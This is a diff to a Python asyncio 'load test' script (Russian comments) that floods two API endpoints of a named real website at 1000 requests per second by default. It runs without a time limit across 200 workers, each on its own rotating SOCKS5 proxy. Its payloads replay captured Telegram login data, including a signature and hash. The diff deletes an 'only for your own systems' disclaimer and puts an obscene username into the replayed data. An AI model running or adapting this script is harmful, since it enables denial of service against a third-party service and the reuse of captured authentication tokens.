@@ -15,18 +15,19 @@ BASE_URL = "https://jameteam.com"
 ENDPOINT1 = "/portals/api/log"
 ENDPOINT2 = "/portals/api/browser_auth_sta"
 
-RPS_TOTAL = int(os.getenv("RPS_TOTAL", "1000"))      # общий RPS
-RATIO1 = float(os.getenv("RATIO1", "0.5"))           # доля на первый эндпоинт (0..1)
-DURATION = int(os.getenv("DURATION_SECONDS", "0"))   # 0 = бесконечно
-MAX_WORKERS = int(os.getenv("MAX_WORKERS", "200"))   # кол-во воркеров (потоков)
-TIMEOUT = int(os.getenv("TIMEOUT", "5"))             # таймаут запроса (сек)
-PROXY_FILE = os.getenv("PROXY_FILE", "proxy.txt")    # файл со списком прокси
+RPS_TOTAL = int(os.getenv("RPS_TOTAL", "1000"))
+RATIO1 = float(os.getenv("RATIO1", "0.5"))
+DURATION = int(os.getenv("DURATION_SECONDS", "0"))
+MAX_WORKERS = int(os.getenv("MAX_WORKERS", "200"))
+TIMEOUT = int(os.getenv("TIMEOUT", "5"))
+PROXY_FILE = os.getenv("PROXY_FILE", "proxy.txt")
+LOG_LEVEL = os.getenv("LOG_LEVEL", "full")   # full, compact, off
 
-# ---------- PAYLOAD для /api/log ----------
+# ---------- PAYLOADs ----------
 PAYLOAD1 = {
     "action": "app_opened",
     "bot_id": "3308",
-    "initData": "query_id=AAG0PbMlAAAAALQ9syWANX0a&user=%7B%22id%22%3A632503732%2C%22first_name%22%3A%22%F0%9F%91%89%F0%9F%8F%BB%F0%9F%91%8C%F0%9F%8F%BB%F0%9F%A5%B5%22%2C%22last_name%22%3A%22%22%2C%22username%22%3A%22rekrut%22%2C%22language_code%22%3A%22ru%22%2C%22is_premium%22%3Atrue%2C%22allows_write_to_pm%22%3Atrue%2C%22photo_url%22%3A%22https%3A%5C%2F%5C%2Ft.me%5C%2Fi%5C%2Fuserpic%5C%2F320%5C%2F3Rh7rfuUzLDv9psEiz8liMd9OP75rDao7HhypSIsBzY.svg%22%7D&auth_date=1777292794&signature=z6Nv9RzGnkCvtZU_v8A9Y2jfYjK3dIiZWXPJKfNHjjdzqkwr86IK28aNbcRLdPBxezitsqLQCE0TrKY34ojQBQ&hash=f63c469fdf06dd45b230cdfae26f5eacdc360b97fa89cc9b93812b40b2dd4262",
+    "initData": "query_id=AAG0PbMlAAAAALQ9syWANX0a&user=%7B%22id%22%3A632503732%2C%22first_name%22%3A%22%F0%9F%91%89%F0%9F%8F%BB%F0%9F%91%8C%F0%9F%8F%BB%F0%9F%A5%B5%22%2C%22last_name%22%3A%22%22%2C%22username%22%3A%22fuckyourmother%22%2C%22language_code%22%3A%22ru%22%2C%22is_premium%22%3Atrue%2C%22allows_write_to_pm%22%3Atrue%2C%22photo_url%22%3A%22https%3A%5C%2F%5C%2Ft.me%5C%2Fi%5C%2Fuserpic%5C%2F320%5C%2F3Rh7rfuUzLDv9psEiz8liMd9OP75rDao7HhypSIsBzY.svg%22%7D&auth_date=1777292794&signature=z6Nv9RzGnkCvtZU_v8A9Y2jfYjK3dIiZWXPJKfNHjjdzqkwr86IK28aNbcRLdPBxezitsqLQCE0TrKY34ojQBQ&hash=f63c469fdf06dd45b230cdfae26f5eacdc360b97fa89cc9b93812b40b2dd4262",
     "user": {
         "id": 632503732,
         "first_name": "👉🏻👌🏻🥵",
@@ -39,7 +40,6 @@ PAYLOAD1 = {
     }
 }
 
-# ---------- PAYLOAD для /api/browser_auth_sta ----------
 PAYLOAD2 = {
     "bot_id": "3308",
     "initData": "query_id=AAG0PbMlAAAAALQ9syWANX0a&user=%7B%22id%22%3A632503732%2C%22first_name%22%3A%22%F0%9F%91%89%F0%9F%8F%BB%F0%9F%91%8C%F0%9F%8F%BB%F0%9F%A5%B5%22%2C%22last_name%22%3A%22%22%2C%22username%22%3A%22rekrut%22%2C%22language_code%22%3A%22ru%22%2C%22is_premium%22%3Atrue%2C%22allows_write_to_pm%22%3Atrue%2C%22photo_url%22%3A%22https%3A%5C%2F%5C%2Ft.me%5C%2Fi%5C%2Fuserpic%5C%2F320%5C%2F3Rh7rfuUzLDv9psEiz8liMd9OP75rDao7HhypSIsBzY.svg%22%7D&auth_date=1777292794&signature=z6Nv9RzGnkCvtZU_v8A9Y2jfYjK3dIiZWXPJKfNHjjdzqkwr86IK28aNbcRLdPBxezitsqLQCE0TrKY34ojQBQ&hash=f63c469fdf06dd45b230cdfae26f5eacdc360b97fa89cc9b93812b40b2dd4262",
@@ -72,15 +72,14 @@ stats = {
     "failed": 0,
     "by_endpoint": defaultdict(lambda: {"total": 0, "success": 0, "failed": 0, "times": []}),
     "statuses": defaultdict(int),
-    "errors": defaultdict(int)
+    "errors": defaultdict(int),
+    "last_responses": []   # храним последние 5 ответов для вывода
 }
-proxies = []          # список кортежей (url, login, password)
+proxies = []
 proxy_index = 0
 start_time = 0
 
-# ---------- Функции работы с прокси ----------
 def parse_proxy_line(line):
-    """Парсит строку: login:pass@ip:port или ip:port"""
     line = line.strip()
     if not line or line.startswith('#'):
         return None
@@ -115,14 +114,12 @@ def get_next_proxy():
     proxy_index += 1
     return proxy
 
-# ---------- Выбор эндпоинта ----------
 def get_endpoint_and_payload():
     if random.random() < RATIO1:
         return ENDPOINT1, PAYLOAD1
     else:
         return ENDPOINT2, PAYLOAD2
 
-# ---------- Отправка одного запроса ----------
 async def send_request(session, worker_id, req_id, proxy_info):
     endpoint, payload = get_endpoint_and_payload()
     url = BASE_URL + endpoint
@@ -131,6 +128,8 @@ async def send_request(session, worker_id, req_id, proxy_info):
         async with session.post(url, json=payload, headers=HEADERS, timeout=TIMEOUT) as resp:
             duration = (time.perf_counter() - start) * 1000
             status = resp.status
+            body = await resp.text()
+            # статистика
             stats["total"] += 1
             stats["by_endpoint"][endpoint]["total"] += 1
             stats["by_endpoint"][endpoint]["times"].append(duration)
@@ -138,35 +137,44 @@ async def send_request(session, worker_id, req_id, proxy_info):
             if 200 <= status < 300:
                 stats["success"] += 1
                 stats["by_endpoint"][endpoint]["success"] += 1
-                if req_id % 50 == 0:
-                    body = await resp.text()
-                    print(f"[{datetime.now():%H:%M:%S}] ✅ #{req_id} {endpoint} {status} {duration:.0f}ms | {body[:100]}")
             else:
                 stats["failed"] += 1
                 stats["by_endpoint"][endpoint]["failed"] += 1
-                body = await resp.text()
-                print(f"[{datetime.now():%H:%M:%S}] ⚠️ #{req_id} {endpoint} {status} {duration:.0f}ms | {body[:200]}")
+                # сохраняем последние ответы с ошибками
+                stats["last_responses"].append((status, body[:500]))
+                if len(stats["last_responses"]) > 5:
+                    stats["last_responses"].pop(0)
+
+            # --- ЛОГИРОВАНИЕ ОТВЕТА СЕРВЕРА ---
+            if LOG_LEVEL == "full":
+                print(f"[{datetime.now():%H:%M:%S}] #{req_id} {endpoint} {status} {duration:.0f}ms")
+                print(f"    Ответ: {body[:300]}{'...' if len(body)>300 else ''}")
+            elif LOG_LEVEL == "compact":
+                if status >= 400 or req_id % 10 == 0:
+                    print(f"[{datetime.now():%H:%M:%S}] #{req_id} {endpoint} {status} {duration:.0f}ms | {body[:100]}")
+            # else off — ничего
+
     except asyncio.TimeoutError:
         duration = (time.perf_counter() - start) * 1000
         stats["total"] += 1
         stats["failed"] += 1
         stats["by_endpoint"][endpoint]["failed"] += 1
         stats["errors"]["Timeout"] += 1
-        print(f"[{datetime.now():%H:%M:%S}] ❌ #{req_id} {endpoint} TIMEOUT {duration:.0f}ms")
+        if LOG_LEVEL != "off":
+            print(f"[{datetime.now():%H:%M:%S}] ❌ #{req_id} {endpoint} TIMEOUT {duration:.0f}ms")
     except Exception as e:
         duration = (time.perf_counter() - start) * 1000
         stats["total"] += 1
         stats["failed"] += 1
         stats["by_endpoint"][endpoint]["failed"] += 1
         stats["errors"][type(e).__name__] += 1
-        if stats["total"] % 50 == 0:
+        if LOG_LEVEL != "off" and stats["total"] % 50 == 0:
             print(f"[{datetime.now():%H:%M:%S}] ❌ #{req_id} {endpoint} {type(e).__name__} {duration:.0f}ms")
 
-# ---------- Воркер (каждый на своём прокси) ----------
 async def worker(worker_id, rate_per_sec):
     interval = 1.0 / rate_per_sec
     next_time = time.perf_counter()
-    proxy_info = get_next_proxy()  # закрепляем прокси за воркером
+    proxy_info = get_next_proxy()
     connector = None
     if proxy_info:
         proxy_url, login, password = proxy_info
@@ -188,7 +196,6 @@ async def worker(worker_id, rate_per_sec):
             else:
                 next_time = time.perf_counter()
 
-# ---------- Репортёр статистики ----------
 async def stats_reporter():
     last_total = 0
     last_time = time.perf_counter()
@@ -213,15 +220,19 @@ async def stats_reporter():
                         sorted_t = sorted(times[-500:])
                         p95 = sorted_t[int(len(sorted_t)*0.95)] if sorted_t else 0
                         print(f"   {ep}: {ep_total} запросов, успех {ep_rate:.1f}%, p95={p95:.0f}мс")
+            # Покажем последние ответы с ошибками (если есть)
+            if stats["last_responses"]:
+                print("\n📦 Последние ответы с ошибками (статус, фрагмент тела):")
+                for status, body_frag in stats["last_responses"][-3:]:
+                    print(f"   {status}: {body_frag[:150]}")
             print(f"{'='*80}")
             last_total, last_time = cur_total, now
 
-# ---------- Основная функция ----------
 async def main():
     global running, start_time
     load_proxies()
     print("█" * 80)
-    print("🔥 НАГРУЗОЧНЫЙ ТЕСТ с поддержкой SOCKS5 прокси (только для своих систем)")
+    print("🔥 НАГРУЗОЧНЫЙ ТЕСТ с выводом ответов сервера (LOG_LEVEL={})".format(LOG_LEVEL))
     print(f"🎯 Эндпоинты: {ENDPOINT1} и {ENDPOINT2}")
     print(f"⚡ Общий RPS: {RPS_TOTAL} | Доля 1-го: {RATIO1*100:.0f}% | Воркеров: {MAX_WORKERS}")
     print(f"🔧 Прокси: {'загружены' if proxies else 'не используются'} (всего {len(proxies)} шт.)")
@@ -274,5 +285,9 @@ if __name__ == "__main__":
             print("\nСтатусы:", dict(sorted(stats["statuses"].items(), key=lambda x: x[1], reverse=True)[:10]))
             if stats["errors"]:
                 print("Ошибки:", dict(stats["errors"]))
+            if stats["last_responses"]:
+                print("\nПримеры ответов с ошибками:")
+                for status, body in stats["last_responses"][-3:]:
+                    print(f"   [{status}] {body[:200]}")
         print("█" * 80)
         loop.close()
